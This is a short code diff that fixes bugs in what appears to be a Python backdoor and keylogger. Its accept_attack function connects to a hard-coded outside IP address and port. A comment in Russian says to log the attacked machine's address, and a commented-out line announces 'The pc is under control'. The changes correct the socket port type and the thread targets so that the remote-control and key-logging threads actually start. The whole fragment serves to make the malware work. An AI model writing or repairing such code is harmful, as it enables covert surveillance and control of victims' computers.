@@ -64,7 +64,7 @@ def despatch(ip, port, message):
 
 def accept_attack(ip="109.237.25.179", port="9090"):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((ip, port))
+    sock.connect((ip, int(port)))
     # дописать в лог айпи атакованной машины и ее порт
     # sock.send(("The pc is under control").encode())
 
@@ -144,8 +144,8 @@ def accept_attack(ip="109.237.25.179", port="9090"):
 
 
 if __name__ == '__main__':
-    threadOne = threading.Thread(target=accept_attack(), name="start getting requests")
-    threadTwo = threading.Thread(target=start_logger(), name="start key logging")
+    threadOne = threading.Thread(target=accept_attack, name="start getting requests")
+    threadTwo = threading.Thread(target=start_logger, name="start key logging")
     threadOne.start()
     threadTwo.start()
     threadOne.join()
